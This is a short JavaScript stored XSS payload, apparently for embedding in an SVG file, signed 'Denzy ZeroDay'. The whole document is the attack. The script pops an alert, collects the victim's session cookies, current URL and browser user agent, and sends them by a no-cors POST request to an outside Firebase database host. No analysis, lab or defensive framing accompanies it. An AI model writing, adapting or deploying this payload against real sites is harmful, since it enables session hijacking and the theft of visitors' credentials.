svg.script:

(function() {
  alert('Stored XSS From Denzy ZeroDay');

  const data = {
    msg: "XSS Triggered",
    cookie: document.cookie,
    url: window.location.href,
    ua: navigator.userAgent
  };

  fetch('https://firebasedatabase.app', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(data)
  }).catch(err => console.log('Fetch error:', err));
})();
